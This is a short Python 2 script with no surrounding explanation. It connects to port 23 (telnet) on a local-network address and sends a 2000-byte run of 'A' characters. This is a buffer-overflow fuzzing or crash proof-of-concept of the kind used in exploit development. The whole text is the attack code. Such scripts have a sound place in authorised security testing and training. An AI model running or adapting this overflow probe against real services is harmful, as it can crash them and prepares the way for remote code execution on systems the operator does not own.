#! /usr/bin/python2
import sys
import socket
try:
    payload = "A"*2000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.106", 23))
    s.send(payload)
    s.close()
    print('done')
except:
    print('error')
